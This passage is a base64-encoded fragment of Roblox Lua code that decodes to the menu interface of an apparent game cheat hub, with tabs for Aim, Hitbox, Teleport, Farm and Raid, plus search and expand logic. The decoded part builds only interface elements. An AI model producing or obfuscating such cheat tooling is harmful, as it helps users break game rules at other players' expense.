ZWFyY2hCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICBTZWFyY2hCYXIuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICBTZWFyY2hCYXIuUGxhY2Vob2xkZXJUZXh0ID0gIlNlYXJjaC4uLiIKICAgIFNlYXJjaEJhci5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgU2VhcmNoQmFyLlRleHRTaXplID0gMTAKICAgIFNlYXJjaEJhci5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBTZWFyY2hCYXIuUGFyZW50ID0gSGVhZGVyCiAgICBsb2NhbCBTQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIFNDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkgU0Nvcm5lci5QYXJlbnQgPSBTZWFyY2hCYXIKCiAgICAtLSBTZXBhcmF0b3IKICAgIGxvY2FsIFNlcGFyYXRvciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgU2VwYXJhdG9yLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMSkKICAgIFNlcGFyYXRvci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAzMCkKICAgIFNlcGFyYXRvci5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA1MCkKICAgIFNlcGFyYXRvci5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBTZXBhcmF0b3IuUGFyZW50ID0gTGVmdFBhbmVsCgogICAgLS0gPT09IFRBQlMgKDUgT25nbGV0cykgPT09CiAgICBsb2NhbCBUYWJDb250YWluZXIgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIFRhYkNvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDEsIC0yMCwgMCwgMjUpCiAgICBUYWJDb250YWluZXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDQwKQogICAgVGFiQ29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBUYWJDb250YWluZXIuUGFyZW50ID0gTGVmdFBhbmVsCgogICAgbG9jYWwgVGFiTGF5b3V0ID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiKQogICAgVGFiTGF5b3V0LkZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uSG9yaXpvbnRhbAogICAgVGFiTGF5b3V0LlNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyCiAgICBUYWJMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDUpCiAgICBUYWJMYXlvdXQuUGFyZW50ID0gVGFiQ29udGFpbmVyCgogICAgbG9jYWwgUGFnZUNvbnRhaW5lciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgUGFnZUNvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDEsIC0yMCwgMSwgLTgwKQogICAgUGFnZUNvbnRhaW5lci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMCwgNzUpCiAgICBQYWdlQ29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBQYWdlQ29udGFpbmVyLlBhcmVudCA9IExlZnRQYW5lbAoKICAgIGxvY2FsIHRhYnMgPSB7fQogICAgbG9jYWwgcGFnZXMgPSB7fQoKICAgIGxvY2FsIGZ1bmN0aW9uIGNyZWF0ZVRhYkJ1dHRvbih0ZXh0LCBvcmRlciwgcGFyZW50KQogICAgICAgIGxvY2FsIEJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC4yLCAtNCwgMSwgMCkgLS0gQWRqdXN0ZWQgZm9yIDUgdGFicwogICAgICAgIEJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgICAgICBCdXR0b24uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApCiAgICAgICAgQnV0dG9uLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICAgICAgQnV0dG9uLlRleHRTaXplID0gNQogICAgICAgIEJ1dHRvbi5UZXh0V3JhcHBlZCA9IGZhbHNlCiAgICAgICAgQnV0dG9uLlRleHQgPSB0ZXh0CiAgICAgICAgQnV0dG9uLkxheW91dE9yZGVyID0gb3JkZXIKICAgICAgICBCdXR0b24uUGFyZW50ID0gcGFyZW50IG9yIFRhYkNvbnRhaW5lcgogICAgICAgIAogICAgICAgIGxvY2FsIENvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgICAgIENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKQogICAgICAgIENvcm5lci5QYXJlbnQgPSBCdXR0b24KICAgICAgICAKICAgICAgICBsb2NhbCBTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgICAgICBTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgIFN0cm9rZS5UaGlja25lc3MgPSAxCiAgICAgICAgU3Ryb2tlLlBhcmVudCA9IEJ1dHRvbgogICAgICAgIAogICAgICAgIHJldHVybiBCdXR0b24KICAgIGVuZAoKICAgIGxvY2FsIFRhYkJ0bnMgPSB7CiAgICAgICAgUGxheWVycyA9IGNyZWF0ZVRhYkJ1dHRvbigiUGxheWVycyIsIDEsIFRhYkNvbnRhaW5lciksCiAgICAgICAgVmlzdWFscyA9IGNyZWF0ZVRhYkJ1dHRvbigiVmlzdWFscyIsIDIsIFRhYkNvbnRhaW5lciksCiAgICAgICAgQWltID0gY3JlYXRlVGFiQnV0dG9uKCJBaW0iLCAzLCBUYWJDb250YWluZXIpLAogICAgICAgIEhpdGJveCA9IGNyZWF0ZVRhYkJ1dHRvbigiSGl0Ym94IiwgNCwgVGFiQ29udGFpbmVyKSwKICAgICAgICBUZWxlcG9ydCA9IGNyZWF0ZVRhYkJ1dHRvbigiVGVsZXBvcnQiLCA1LCBUYWJDb250YWluZXIpLAogICAgICAgIEZhcm0gPSBjcmVhdGVUYWJCdXR0b24oIkZhcm0iLCA2LCBUYWJDb250YWluZXIpLAogICAgICAgIFJhaWQgPSBjcmVhdGVUYWJCdXR0b24oIlJhaWQiLCA3LCBUYWJDb250YWluZXIpLAogICAgICAgIFNldHRpbmdzID0gY3JlYXRlVGFiQnV0dG9uKCJTZXR0aW5ncyIsIDgsIFRhYkNvbnRhaW5lciksCiAgICAgICAgU2hvcCA9IGNyZWF0ZVRhYkJ1dHRvbigiTWlzYyIsIDksIFRhYkNvbnRhaW5lciksCiAgICAgICAgU2VhRXZlbnQgPSBjcmVhdGVUYWJCdXR0b24oIlNlYSBFdmVudCIsIDEwLCBUYWJDb250YWluZXIpLAogICAgICAgIEN1c3RvbSA9IGNyZWF0ZVRhYkJ1dHRvbigiQ3VzdG9tIiwgMTEsIFRhYkNvbnRhaW5lciksCiAgICAgICAgRmFybVNjcmlwdHMgPSBjcmVhdGVUYWJCdXR0b24oIlNjcmlwdHMiLCA2LjEsIFRhYkNvbnRhaW5lciksCiAgICAgICAgRmFybVNldHRpbmdzID0gY3JlYXRlVGFiQnV0dG9uKCJTZXR0aW5ncyIsIDYuMiwgVGFiQ29udGFpbmVyKSwKICAgICAgICBGYXJtU3RhdHVzID0gY3JlYXRlVGFiQnV0dG9uKCJTdGF0dXMiLCA2LjMsIFRhYkNvbnRhaW5lciksCiAgICAgICAgRmFybUZhcm1pbmcgPSBjcmVhdGVUYWJCdXR0b24oIkZhcm1pbmciLCA2LjQsIFRhYkNvbnRhaW5lcikKICAgIH0KCiAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVQYWdlKG5hbWUsIHBhcmVudCkKICAgICAgICBsb2NhbCBQYWdlID0gSW5zdGFuY2UubmV3KCJTY3JvbGxpbmdGcmFtZSIpCiAgICAgICAgUGFnZS5OYW1lID0gbmFtZQogICAgICAgIFBhZ2UuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgICAgIFBhZ2UuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBQYWdlLkJvcmRlclNpemVQaXhlbCA9IDAKICAgICAgICBQYWdlLlNjcm9sbEJhclRoaWNrbmVzcyA9IDQKICAgICAgICBQYWdlLlNjcm9sbEJhckltYWdlQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA3MCkKICAgICAgICBQYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIFBhZ2UuUGFyZW50ID0gcGFyZW50IG9yIFBhZ2VDb250YWluZXIKICAgICAgICBQYWdlLkF1dG9tYXRpY0NhbnZhc1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWQogICAgICAgIFBhZ2UuQ2FudmFzU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQogICAgICAgIAogICAgICAgIGxvY2FsIExheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IikKICAgICAgICBMYXlvdXQuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICBMYXlvdXQuUGFkZGluZyA9IFVEaW0ubmV3KDAsIDUpCiAgICAgICAgTGF5b3V0LlBhcmVudCA9IFBhZ2UKICAgICAgICAKICAgICAgICBsb2NhbCBQYWRkaW5nID0gSW5zdGFuY2UubmV3KCJVSVBhZGRpbmciKQogICAgICAgIFBhZGRpbmcuUGFkZGluZ1JpZ2h0ID0gVURpbS5uZXcoMCwgNikKICAgICAgICBQYWRkaW5nLlBhcmVudCA9IFBhZ2UKICAgICAgICAKICAgICAgICByZXR1cm4gUGFnZQogICAgZW5kCgogICAgbG9jYWwgUGFnZXMgPSB7CiAgICAgICAgUGxheWVycyA9IGNyZWF0ZVBhZ2UoIlBsYXllcnNQYWdlIiwgUGFnZUNvbnRhaW5lciksCiAgICAgICAgVmlzdWFscyA9IGNyZWF0ZVBhZ2UoIlZpc3VhbHNQYWdlIiwgUGFnZUNvbnRhaW5lciksCiAgICAgICAgQWltID0gY3JlYXRlUGFnZSgiQWltUGFnZSIsIFBhZ2VDb250YWluZXIpLAogICAgICAgIEhpdGJveCA9IGNyZWF0ZVBhZ2UoIkhpdGJveFBhZ2UiLCBQYWdlQ29udGFpbmVyKSwKICAgICAgICBUZWxlcG9ydCA9IGNyZWF0ZVBhZ2UoIlRlbGVwb3J0UGFnZSIsIFBhZ2VDb250YWluZXIpLAogICAgICAgIEZhcm0gPSBjcmVhdGVQYWdlKCJGYXJtUGFnZSIsIFBhZ2VDb250YWluZXIpLAogICAgICAgIEZhcm1TY3JpcHRzID0gY3JlYXRlUGFnZSgiRmFybVNjcmlwdHNQYWdlIiwgUGFnZUNvbnRhaW5lciksCiAgICAgICAgRmFybVNldHRpbmdzID0gY3JlYXRlUGFnZSgiRmFybVNldHRpbmdzUGFnZSIsIFBhZ2VDb250YWluZXIpLAogICAgICAgIEZhcm1TdGF0dXMgPSBjcmVhdGVQYWdlKCJGYXJtU3RhdHVzUGFnZSIsIFBhZ2VDb250YWluZXIpLAogICAgICAgIEZhcm1GYXJtaW5nID0gY3JlYXRlUGFnZSgiRmFybUZhcm1pbmdQYWdlIiwgUGFnZUNvbnRhaW5lciksCiAgICAgICAgUmFpZCA9IGNyZWF0ZVBhZ2UoIlJhaWRQYWdlIiwgUGFnZUNvbnRhaW5lciksCiAgICAgICAgU2V0dGluZ3MgPSBjcmVhdGVQYWdlKCJTZXR0aW5nc1BhZ2UiLCBQYWdlQ29udGFpbmVyKSwKICAgICAgICBTaG9wID0gY3JlYXRlUGFnZSgiU2hvcFBhZ2UiLCBQYWdlQ29udGFpbmVyKSwKICAgICAgICBTZWFFdmVudCA9IGNyZWF0ZVBhZ2UoIlNlYUV2ZW50UGFnZSIsIFBhZ2VDb250YWluZXIpLAogICAgICAgIE1pc2MgPSBjcmVhdGVQYWdlKCJNaXNjUGFnZSIsIFBhZ2VDb250YWluZXIpLAogICAgICAgIEN1c3RvbSA9IGNyZWF0ZVBhZ2UoIkN1c3RvbVBhZ2UiLCBQYWdlQ29udGFpbmVyKSwKICAgICAgICBTZWFyY2ggPSBjcmVhdGVQYWdlKCJTZWFyY2hQYWdlIiwgUGFnZUNvbnRhaW5lcikKICAgIH0KCiAgICBsb2NhbCBmdW5jdGlvbiBzd2l0Y2hUYWIodGFiTmFtZSkKICAgICAgICBmb3IgbmFtZSwgYnRuIGluIHBhaXJzKFRhYkJ0bnMpIGRvCiAgICAgICAgICAgIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjUsIDI1LCAzMCkKICAgICAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTUwKQogICAgICAgICAgICBidG4uVUlTdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDUwKQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIENsZWFyIFNlYXJjaCB3aGVuIHN3aXRjaGluZyB0YWJzCiAgICAgICAgaWYgU2VhcmNoQmFyLlRleHQgfj0gIiIgdGhlbiBTZWFyY2hCYXIuVGV4dCA9ICIiIGVuZAogICAgICAgIAogICAgICAgIGZvciBuYW1lLCBwYWdlIGluIHBhaXJzKFBhZ2VzKSBkbwogICAgICAgICAgICBwYWdlLlZpc2libGUgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIFRhYkJ0bnNbdGFiTmFtZV0uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDM1LCAzNSwgNDUpCiAgICAgICAgVGFiQnRuc1t0YWJOYW1lXS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICBUYWJCdG5zW3RhYk5hbWVdLlVJU3Ryb2tlLkNvbG9yID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICBQYWdlc1t0YWJOYW1lXS5WaXNpYmxlID0gdHJ1ZQogICAgZW5kCgogICAgLS0gU2VhcmNoIExvZ2ljCiAgICBsb2NhbCBhbGxJdGVtcyA9IHt9CiAgICBsb2NhbCBmdW5jdGlvbiBJbml0U2VhcmNoKCkKICAgICAgICBhbGxJdGVtcyA9IHt9CiAgICAgICAgZm9yIG5hbWUsIHBhZ2UgaW4gcGFpcnMoUGFnZXMpIGRvCiAgICAgICAgICAgIGlmIG5hbWUgfj0gIlNlYXJjaCIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgY2hpbGRyZW4gPSBwYWdlOkdldENoaWxkcmVuKCkKICAgICAgICAgICAgICAgIHRhYmxlLnNvcnQoY2hpbGRyZW4sIGZ1bmN0aW9uKGEsIGIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgb3JkZXJBID0gKGE6SXNBKCJHdWlPYmplY3QiKSBhbmQgYS5MYXlvdXRPcmRlcikgb3IgMAogICAgICAgICAgICAgICAgICAgIGxvY2FsIG9yZGVyQiA9IChiOklzQSgiR3VpT2JqZWN0IikgYW5kIGIuTGF5b3V0T3JkZXIpIG9yIDAKICAgICAgICAgICAgICAgICAgICByZXR1cm4gb3JkZXJBIDwgb3JkZXJCCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRTZWN0aW9uSWQgPSBuYW1lIC4uICJfMCIKICAgICAgICAgICAgICAgIGxvY2FsIHNlY3Rpb25Db3VudCA9IDAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIF8sIGNoaWxkIGluIGlwYWlycyhjaGlsZHJlbikgZG8KICAgICAgICAgICAgICAgICAgICBpZiBub3QgKGNoaWxkOklzQSgiVUlMaXN0TGF5b3V0Iikgb3IgY2hpbGQ6SXNBKCJVSVBhZGRpbmciKSkgdGhlbgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAtLSBJZGVudGlmeSBTZWN0aW9uIEhlYWRlciBieSBDb2xvciAoU3BlY2lmaWMgdG8gY3JlYXRlU2VjdGlvbjogODAsIDgwLCA5MCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2hpbGQ6SXNBKCJUZXh0TGFiZWwiKSBhbmQgY2hpbGQuVGV4dENvbG9yMyA9PSBDb2xvcjMuZnJvbVJHQig4MCwgODAsIDkwKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWN0aW9uQ291bnQgPSBzZWN0aW9uQ291bnQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50U2VjdGlvbklkID0gbmFtZSAuLiAiXyIgLi4gc2VjdGlvbkNvdW50CiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGFsbEl0ZW1zLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmogPSBjaGlsZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9yaWdpbmFsUGFyZW50ID0gcGFnZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlY3Rpb25JZCA9IGN1cnJlbnRTZWN0aW9uSWQKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAoKICAgIFNlYXJjaEJhcjpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlRleHQiKTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB0ZXh0ID0gU2VhcmNoQmFyLlRleHQ6bG93ZXIoKQogICAgICAgIGlmIHRleHQgPT0gIiIgdGhlbgogICAgICAgICAgICBpZiAjYWxsSXRlbXMgPiAwIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBpdGVtIGluIHBhaXJzKGFsbEl0ZW1zKSBkbwogICAgICAgICAgICAgICAgICAgIGl0ZW0uT2JqLlBhcmVudCA9IGl0ZW0uT3JpZ2luYWxQYXJlbnQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgYWxsSXRlbXMgPSB7fQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZm9yIG5hbWUsIGJ0biBpbiBwYWlycyhUYWJCdG5zKSBkbwogICAgICAgICAgICAgICAgaWYgYnRuLkJhY2tncm91bmRDb2xvcjMgPT0gQ29sb3IzLmZyb21SR0IoMzUsIDM1LCA0NSkgdGhlbgogICAgICAgICAgICAgICAgICAgIFBhZ2VzW25hbWVdLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIFBhZ2VzLlNlYXJjaC5WaXNpYmxlID0gZmFsc2UKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmICNhbGxJdGVtcyA9PSAwIHRoZW4gSW5pdFNlYXJjaCgpIGVuZAogICAgICAgICAgICBmb3IgXywgcGFnZSBpbiBwYWlycyhQYWdlcykgZG8gcGFnZS5WaXNpYmxlID0gZmFsc2UgZW5kCiAgICAgICAgICAgIFBhZ2VzLlNlYXJjaC5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgbWF0Y2hpbmdTZWN0aW9ucyA9IHt9CiAgICAgICAgICAgIGZvciBfLCBpdGVtIGluIHBhaXJzKGFsbEl0ZW1zKSBkbwogICAgICAgICAgICAgICAgbG9jYWwgbWF0Y2ggPSBmYWxzZQogICAgICAgICAgICAgICAgaWYgaXRlbS5PYmo6SXNBKCJUZXh0TGFiZWwiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgaXRlbS5PYmouVGV4dDpsb3dlcigpOmZpbmQodGV4dCkgdGhlbiBtYXRjaCA9IHRydWUgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgaXRlbS5PYmo6SXNBKCJGcmFtZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgZGVzYyBpbiBwYWlycyhpdGVtLk9iajpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGVzYzpJc0EoIlRleHRMYWJlbCIpIG9yIGRlc2M6SXNBKCJUZXh0QnV0dG9uIikgb3IgZGVzYzpJc0EoIlRleHRCb3giKSkgYW5kIGRlc2MuVGV4dDpsb3dlcigpOmZpbmQodGV4dCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWF0Y2ggPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBtYXRjaCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbWF0Y2hpbmdTZWN0aW9uc1tpdGVtLlNlY3Rpb25JZF0gPSB0cnVlCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBmb3IgXywgaXRlbSBpbiBwYWlycyhhbGxJdGVtcykgZG8KICAgICAgICAgICAgICAgIGlmIG1hdGNoaW5nU2VjdGlvbnNbaXRlbS5TZWN0aW9uSWRdIHRoZW4KICAgICAgICAgICAgICAgICAgICBpdGVtLk9iai5QYXJlbnQgPSBQYWdlcy5TZWFyY2gKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBpdGVtLk9iai5QYXJlbnQgPSBpdGVtLk9yaWdpbmFsUGFyZW50CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgZm9yIG5hbWUsIGJ0biBpbiBwYWlycyhUYWJCdG5zKSBkbwogICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkgc3dpdGNoVGFiKG5hbWUpIGVuZCkKICAgIGVuZAogICAgCiAgICAtLSBIaWRlIEZhcm0gYnkgZGVmYXVsdAogICAgVGFiQnRucy5GYXJtLlZpc2libGUgPSBmYWxzZQogICAgVGFiQnRucy5SYWlkLlZpc2libGUgPSBmYWxzZQogICAgVGFiQnRucy5TZXR0aW5ncy5WaXNpYmxlID0gZmFsc2UKICAgIFRhYkJ0bnMuU2hvcC5WaXNpYmxlID0gZmFsc2UKICAgIFRhYkJ0bnMuU2VhRXZlbnQuVmlzaWJsZSA9IGZhbHNlCiAgICBUYWJCdG5zLkN1c3RvbS5WaXNpYmxlID0gZmFsc2UKICAgIFRhYkJ0bnMuRmFybVNjcmlwdHMuVmlzaWJsZSA9IGZhbHNlCiAgICBUYWJCdG5zLkZhcm1TZXR0aW5ncy5WaXNpYmxlID0gZmFsc2UKICAgIFRhYkJ0bnMuRmFybVN0YXR1cy5WaXNpYmxlID0gZmFsc2UKICAgIFRhYkJ0bnMuRmFybUZhcm1pbmcuVmlzaWJsZSA9IGZhbHNlCiAgICAKICAgIC0tIEVYUEFORCBCVVRUT04gKEFycm93IExvZ2ljKQogICAgbG9jYWwgRXhwYW5kQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIEV4cGFuZEJ1dHRvbi5OYW1lID0gIkV4cGFuZEJ1dHRvbiIKICAgIEV4cGFuZEJ1dHRvbi5UZXh0ID0gIuKWuiIKICAgIEV4cGFuZEJ1dHRvbi5TaXplID0gVURpbTIubmV3KDAsIDIwLCAwLCAyMCkKICAgIEV4cGFuZEJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtMjUsIDAsIDUpCiAgICBFeHBhbmRCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMzApCiAgICBFeHBhbmRCdXR0b24uVGV4dENvbG9yMyA9IEN1cnJlbnRUaGVtZUNvbG9yCiAgICBFeHBhbmRCdXR0b24uRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCiAgICBFeHBhbmRCdXR0b24uVGV4dFNpemUgPSAxNAogICAgRXhwYW5kQnV0dG9uLlBhcmVudCA9IExlZnRQYW5lbAogICAgCiAgICBsb2NhbCBFeHBhbmRDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIEV4cGFuZENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA0KQogICAgRXhwYW5kQ29ybmVyLlBhcmVudCA9IEV4cGFuZEJ1dHRvbgogICAgCiAgICBsb2NhbCBFeHBhbmRTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgIEV4cGFuZFN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICBFeHBhbmRTdHJva2UuVGhpY2tuZXNzID0gMQogICAgRXhwYW5kU3Ryb2tlLlBhcmVudCA9IEV4cGFuZEJ1dHRvbgogICAgCiAgICBsb2NhbCBpc0V4cGFuZGVkID0gZmFsc2UKICAgIEV4cGFuZEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpc0V4cGFuZGVkID0gbm90IGlzRXhwYW5kZWQKICAgICAgICBpZiBpc0V4cGFuZGVkIHRoZW4KICAgICAgICAgICAgLS0gQW5pbWF0aW9uIGQnb3V2ZXJ0dXJlCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoTWFpbkZyYW1lLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1NpemUgPSBVRGltMi5uZXcoMCwgNzAwLCAwLCA1MDApfSk6UGxheSgpCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoUmlnaHRQYW5lbCwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuUXVhcnQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gVURpbTIubmV3KDAsIDMwMCwgMSwgMCl9KTpQbGF5KCkKICAgICAgICAgICAgRXhwYW5kQnV0dG9uLlRleHQgPSAi4peEIgogICAgICAgIGVsc2UKICAgICAgICAgICAgLS0gQW5pbWF0aW9uIGRlIGZlcm1ldHVyZQogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKE1haW5GcmFtZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuUXVhcnQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gVURpbTIubmV3KDAsIDQwMCwgMCwgNTAwKX0pOlBsYXkoKQogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKFJpZ2h0UGFuZWwsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLlF1YXJ0LCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAxLCAwKX0pOlBsYXkoKQogICAgICAgICAgICBFeHBhbmRCdXR0b24uVGV4dCA9ICLilroiCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tIFJJR0hUIFBBTkVMIENPTlRFTlQgKFBsYWNlaG9sZGVycykKICAgIGxvY2FsIFJpZ2h0VGl0bGUgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBSaWdodFRpdGxlLlRleHQgPSAiQ1VTVE9NIEhVQiIKICAgIFJpZ2h0VGl0bGUuU2l6ZSA9IFVEaW0y" .. "Lm5ldygxLCAwLCAwLCAzMCkKICAgIFJpZ2h0VGl0bGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFJpZ2h0VGl0bGUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDEwMCwgMTAwLCAxMDApCiAgICBSaWdodFRpdGxlLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgUmlnaHRUaXRsZS5UZXh0U2l6ZSA9IDkKICAgIFJpZ2h0VGl0bGUuUGFyZW50ID0gUmlnaHRQYW5lbAogICAgCiAgICBsb2NhbCBSaWdodFRhYkNvbnRhaW5lciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgUmlnaHRUYWJDb250YWluZXIuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMjAsIDAsIDI1KQogICAgUmlnaHRUYWJDb250YWluZXIuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDQwKQogICAgUmlnaHRUYWJDb250YWluZXIuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFJpZ2h0VGFiQ29udGFpbmVyLl